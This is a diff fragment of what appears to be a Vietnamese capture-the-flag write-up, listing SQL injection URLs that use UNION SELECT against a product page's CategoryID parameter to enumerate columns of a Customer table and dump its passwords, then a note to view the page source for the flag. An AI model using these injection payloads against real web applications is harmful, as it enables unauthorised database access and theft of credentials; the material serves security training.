@@ -29,7 +29,7 @@ https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 union select '1', table_
 https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 union select '1', column_name, '3', '4' from information_schema.columns where table_name = 'Customer'
 - Lấy dữ liệu password của Customer
 https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 union select '1', password, '3', '4' from Customer
-
+==> Chuyển qua view page source để lấyflag
 ----------
 
 ###CTF4 - Picture Gallery
